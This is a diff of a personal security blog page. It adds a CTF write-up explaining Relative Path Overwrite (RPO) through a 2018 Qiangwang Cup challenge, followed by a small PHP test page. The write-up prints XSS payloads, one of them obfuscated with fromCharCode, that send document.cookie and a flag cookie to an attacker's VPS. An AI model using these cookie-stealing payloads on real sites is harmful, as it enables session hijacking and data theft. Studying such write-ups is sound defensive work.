@@ -6,13 +6,13 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://ph0rse.me">
-  <title>Archives | Ph0rse&#39;s Blog</title>
+  <title>Ph0rse&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="CUIT就读，Auto代码审计，唯一优点就是帅~">
 <meta name="keywords" content="Web,安全,Python,Java,PHP,Coder,Hacker,Linux,程序员,工程师,渗透,优化,帅哥,机器学习">
 <meta property="og:type" content="website">
 <meta property="og:title" content="Ph0rse&#39;s Blog">
-<meta property="og:url" content="http://ph0rse.me/archives/index.html">
+<meta property="og:url" content="http://ph0rse.me/page/5/index.html">
 <meta property="og:site_name" content="Ph0rse&#39;s Blog">
 <meta property="og:description" content="CUIT就读，Auto代码审计，唯一优点就是帅~">
 <meta property="og:locale" content="default">
@@ -164,49 +164,185 @@
           <div id="js-content" class="content-ll">
             
   
-  
+    <article id="post-RPO" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/02/16/JavaScript前端盲注/" class="archive-article-date">
-  	<time datetime="2019-02-16T08:57:30.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-02-16</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
     <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/02/16/JavaScript前端盲注/">JavaScript前端盲注</a>
+      <a class="article-title" href="/2018/04/12/RPO/">RPO</a>
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
+        
+        <a href="/2018/04/12/RPO/" class="archive-article-date">
+  	<time datetime="2018-04-11T16:08:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-04-12</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>文章首发于<a href="https://xz.aliyun.com/t/2220" target="_blank" rel="noopener">先知社区</a>,转载请注明来源</p>
+<p>本文由<a href="http://d0g3.club/" target="_blank" rel="noopener">D0g3安全小组</a>，@Ph0rse编写。</p>
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>通过这次强网杯，见识到了RPO这种漏洞，也是在畅师傅的指导下，学习了一波，写篇文章记录一下~</p>
+<p>RPO的全称为“Relative Path Overwrite”，也就是相对路径覆盖。利用浏览器和服务器对资源加载设置的差异，通过某些方法和技巧，在相对路径处，引入我们可控的js/css文件，甚至引入非js/css文件，并按照js/css的语法执行，从而实现攻击。</p>
+<h3 id="Fuck-the-“Share-your-mind”"><a href="#Fuck-the-“Share-your-mind”" class="headerlink" title="Fuck the “Share your mind”"></a>Fuck the “Share your mind”</h3><p>这是18-03-24强网杯的一道题，也是从这里开始接触RPO这个漏洞，以下简单介绍一下这道题的做法:<br>首先就是一个登录界面</p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251627_322.png" alt></p>
+<p>简单测试后可以发现并没有SQL注入或者XSS漏洞，之后注册一个账号，登录进去。测试各个页面，还是没有发现SQL注入<br>在做比赛的小伙伴可能会对以下这个页面很熟悉：</p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251629_161.png" alt><br>没错，就是这个“脸上”写着“这里有FLAG”的页面，而且如果在Reports框里输入<code>http://39.107.33.96:20000/&lt;script src=http://VPSIP &gt;&lt;/script&gt;</code>，它真的会访问我们自己的VPS，结合第一个提示：</p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251639_571.png" alt></p>
+<p>再联想到i春秋的一篇<a href="https://bbs.ichunqiu.com/thread-24786-1-1.html?from=bkyl" target="_blank" rel="noopener">文章</a><br>通过反调PhantomJS XSS bot 把XSS漏洞升级为SSRF/LFR</p>
+<p>惊不惊喜？意不意外？是不是感觉从此拿到FLAG，出任CEO，迎娶白富美，从此走上人生巅峰了？</p>
+<p>呵~想！多！了！</p>
+<p>不知道为什么，VPS上的js代码就是没办法执行</p>
+<p>之后才了解到，真正的漏洞点在这里：</p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251645_841.png" alt></p>
+<p>。。。</p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251647_432.png" alt></p>
+<p>也就是我们今天要介绍的主角，RPO导致的XSS漏洞了……</p>
+<h3 id="phpinfo-url-模式"><a href="#phpinfo-url-模式" class="headerlink" title="phpinfo url 模式"></a>phpinfo url 模式</h3><p>在看漏洞流程之前，我们先介绍一个知识点，就是按照目录方式获取资源，以及phpinfo URL模式。<br><code>http://39.107.33.96:20000/index.php/view/article/763</code><br>难道有一个目录交index.php吗？不是的，它使用了url rewrite的php开发框架，也叫PHPINFO URL模式<br>等价于<br><code>http://39.107.33.96:20000/index.php?mod=view&amp;article=763</code><br>在这道题里，返回的，就是我们输入的文章内容，当标题为空时，只返回内容的纯文本，不包含html代码。<br><img src="http://ovc0f0a85.bkt.clouddn.com/201803261259_304.png" alt></p>
+<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>文章最开始提到过，RPO漏洞就是“相对路径覆盖”，而这道题的漏洞产生，也是因为相对路径</p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803261525_251.png" alt></p>
+<p>我们来分析一下上面导致漏洞的payload</p>
+<p><code>http://39.107.33.96:20000/index.php/view/article/36967/..%2f..%2f..%2f..%2findex.php</code></p>
+<p>对于php而言，它获得的请求是url解码后的，%2F会被解码为/，apache和nginx会按照目录的方式来返回我们请求的资源。</p>
+<p>对于payload，也就相当于访问</p>
+<p><code>http://39.107.33.96:20000/index.php/view/article/36967/../../../../index.php</code></p>
+<p>向上跳了三层，依旧返回index.php页面的内容</p>
+<p>但是！服务端和客户端之间产生了沟通差异，浏览器在寻找js资源的时候，并没有对%2f进行解码，就认为<br><code>..%2f..%2f..%2f..%2findex.php</code>这一坨是一段数据，但是又没有人来接收这段数据，相当于报废。<br>就好比输入url-<code>https://www.baidu.com?id=1</code>，向百度传递了一个参数id，但它后端没有接收的代码，相当于没有传递，返回的资源仍然是<code>https://www.baidu.com</code>的。而<code>http://39.107.33.96:20000/index.php/view/article/36967/..%2f..%2f..%2f..%2findex.php</code>相当于在文章ID为36967的文章页面传了一个叫<code>..%2f..%2f..%2f..%2findex.php</code>的参数，没有人接收，所以返回的资源就只是<code>http://39.107.33.96:20000/index.php/view/article/36967/</code>的。</p>
+<p>浏览器错误理解url后，请求相对路径中请求的资源路径，就变成了<code>http://39.107.33.96:20000/index.php/view/article/36967/..%2f..%2f..%2f..%2findex.php/static/js/jquery.min.js</code></p>
+<p>当我们向服务器提交这个请求的时候，服务器会按照phpinfo模式来读取这个url，</p>
+<p>读到<code>..%2f..%2f..%2f..%2findex.php</code>这里就读不下去了，识别不了，退一步，把前面能识别的内容返回回来，也就是<code>http://39.107.33.96:20000/index.php/view/article/36967/</code></p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251723_122.png" alt></p>
+<p>我们看网络里的请求，也可以看到浏览器按照phpinfo的格式来解析url的话，只会访问到能识别的地方</p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251728_264.png" alt><br>这里要注意，xxxdir只是为了表示这是一个没有用的dir，换成aaadir效果也是一样的，同理把<code>..%2f..%2f..%2f..%2findex.php</code>当做dir也是一样的。</p>
+<p>把<code>http://39.107.33.96:20000/index.php/view/article/36967/</code>的页面内容，也就是<code>alert(1)</code>当做是js文件的内容，带回到了<code>&lt;script&gt;</code>标签中，也就因此，造成了XSS漏洞</p>
+<p>漏洞完成过程<br>首先填写一个只有内容，没有标题的Ideas<br><img src="http://ovc0f0a85.bkt.clouddn.com/201803251734_133.png" alt></p>
+<p>如果标题不为空</p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251736_961.png" alt></p>
+<p>那请求的结果将含有HTML代码，如果这个时候再把返回的数据当做是JavaScript代码解析，就会发生异常。</p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803251736_975.png" alt></p>
+<p>之后我们就可以伪造请求，比如<code>(new Image()).src = &#39;http://VPSIP:Port?&#39;+document.cookie</code><br>由于漏洞点过滤了引号，所以可以用fromCharCode进行绕过处理<br>(new Image()).src = String.fromCharCode(104,116,116,112,58,47,47,53,52,46,50,51,53,46,50,51,52,46,54,56,58,50,51,51,47)+document.cookie;</p>
+<p><img src="http://ovc0f0a85.bkt.clouddn.com/201803261433_906.png" alt><br>写这篇文章的时候，后台的自动点击脚本貌似没在运行了，只能我自己触发一下xss，弹个自己的PHPSESSION回来。比赛过程中会有个提示，让你去打二级目录<code>/QWB_fl4g/QWB/</code></p>
+<p>然后使用iframe标签去读二级目录下的cookie</p>
+<pre><code>iframe
+var iframe = document.createElement(String.fromCharCode(105,102,114,97,109,101));
+iframe.src = String.fromCharCode(47,81,87,66,95,102,108,52,103,47,81,87,66,47);
+iframe.id = String.fromCharCode(102,114,97,109,101);
+document.body.appendChild(iframe);
+iframe.onload = function (){
+    var c = document.getElementById(String.fromCharCode(102,114,97,109,101)).contentWindow.document.cookie;
+var n0t = document.createElement(String.fromCharCode(108,105,110,107));
+n0t.setAttribute(String.fromCharCode(114,101,108), String.fromCharCode(112,114,101,102,101,116,99,104));
+n0t.setAttribute(String.fromCharCode(104,114,101,102), String.fromCharCode(47,47,53,52,46,50,51,53,46,50,51,52,46,54,56,58,50,51,51,47,63,102,108,97,103,61) + c);
+document.head.appendChild(n0t);
+}
+</code></pre><p>VPS处就可以监听到返回的flag~</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>用畅师傅说的一句话总结RPO的核心原理，“RPO漏洞，就是服务端和客户端对这个URL的解析不一致导致的”，其实仔细想一想，任何漏洞不都是这个道理嘛，宽字节，00截断，都是利用不同功能板块之间解析规则的差异，造成语义上的混淆，从而导致了漏洞。</p>
+<h3 id="小练习"><a href="#小练习" class="headerlink" title="小练习"></a>小练习</h3><p>俗话说的好“Talk is cheap, show me the Code”，如果对这RPO还是有疑惑的话，可以用以下的代码片段自己动手测试一下。</p>
+<p>测试代码扒自p00mj师傅的<a href="https://www.cnblogs.com/p00mj/p/6755000.html" target="_blank" rel="noopener">文章</a></p>
+<p>php代码</p>
+<pre><code>&lt;?php $path=&apos;http://localhost/hello/&apos;?&gt;
+&lt;a class=&quot;navbar-brand&quot; href=&quot;&lt;?php echo $path?&gt;url.php&quot;&gt;三国杀&lt;/a&gt;
+&lt;li class=&quot;active&quot; id=&apos;wei&apos;&gt;&lt;a href=&quot;&lt;?php echo $path?&gt;url.php/country/wei&quot;&gt;魏&lt;/a&gt;&lt;/li&gt;
+&lt;li id =&apos;shu&apos;&gt;&lt;a href=&quot;&lt;?php echo $path?&gt;url.php/country/shu&quot;&gt;蜀&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;active&quot; id=&apos;wu&apos;&gt;&lt;a href=&quot;&lt;?php echo $path?&gt;url.php/country/wu&quot;&gt;吴&lt;/a&gt;&lt;/li&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;./style.css&quot; style=&quot;css&quot; /&gt;
+&lt;?php
+$arr=isset($_SERVER[&apos;PATH_INFO&apos;])?explode(&apos;/&apos;,trim($_SERVER[&apos;PATH_INFO&apos;],&apos;/&apos;)):null;
+//var_dump($arr);
+//echo $arr
+$value=&apos;&apos;;
+for($_=0;$_&lt;count($arr);$_+=2)
+{
+    $value[$arr[$_]] = $arr[$_+1];
+}
+$value[&apos;country&apos;]=isset($value[&apos;country&apos;])?$value[&apos;country&apos;]:null;
+switch ($value[&apos;country&apos;]) {
+    case &apos;wei&apos;:
+        ?&gt;
+        &lt;h1&gt;welcome to 魏国!&lt;/h1&gt;
+        &lt;?php
+        break;
+    case &apos;shu&apos;:
+        ?&gt;
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
+        &lt;h1&gt;welcome to 蜀国!&lt;/h1&gt;
+
+        &lt;?php
+        break;
+    case &apos;wu&apos;:
+        ?&gt;
+        &lt;h1&gt;welcome to 吴国!&lt;/h1&gt;
+
+        &lt;?php
+        break;
+
+    default:
+        ?&gt;
+        &lt;h1&gt;welcome!&lt;/h1&gt;
+        &lt;?php
+        break;
+}
+?&gt;
+</code></pre><p>style.css文件</p>
+<pre><code>h1 {
+font-size:180px;
+color:blue;
+}
+</code></pre><p>在绿盟的这篇<a href="http://blog.nsfocus.net/rpo-attack/" target="_blank" rel="noopener">文章</a>中提到说Apache无法解析这种URL，会返回404。其实是默认配置的问题，可以来看<a href="http://www.ideawu.net/blog/archives/494.html" target="_blank" rel="noopener">这篇文章</a></p>
+<p>Pwnhub在之前也出过一道题，<a href="http://www.qingpingshan.com/pc/aq/240597.html" target="_blank" rel="noopener">大物必须过</a>，这位师傅的做题思路很赞，就是没找到师傅的ID……还想着观摩一下博客什么的……</p>
+<p>在Github上也有一个CTF题目的源码，利用RPO，进行XSS+CSRF攻击。</p>
+<p><a href="https://github.com/eboda/34c3ctf/tree/master/urlstorage" target="_blank" rel="noopener">https://github.com/eboda/34c3ctf/tree/master/urlstorage</a></p>
+<p>以上  </p>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://www.cnblogs.com/p00mj/p/6755000.html" target="_blank" rel="noopener">https://www.cnblogs.com/p00mj/p/6755000.html</a><br><a href="http://blog.nsfocus.net/rpo-attack/" target="_blank" rel="noopener">http://blog.nsfocus.net/rpo-attack/</a><br><a href="http://www.qingpingshan.com/pc/aq/240597.html" target="_blank" rel="noopener">http://www.qingpingshan.com/pc/aq/240597.html</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/04/12/RPO/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
-  
-  
-    </div></section>
-  
 
-    
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+  
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/6/">6</a><a class="extend next" rel="next" href="/archives/page/2/">Next &raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/4/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/6/">Next &raquo;</a>
     </nav>
   
 
@@ -230,9 +366,9 @@
     <script>
 	var yiliaConfig = {
 		mathjax: true,
-		isHome: false,
+		isHome: true,
 		isPost: false,
-		isArchive: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
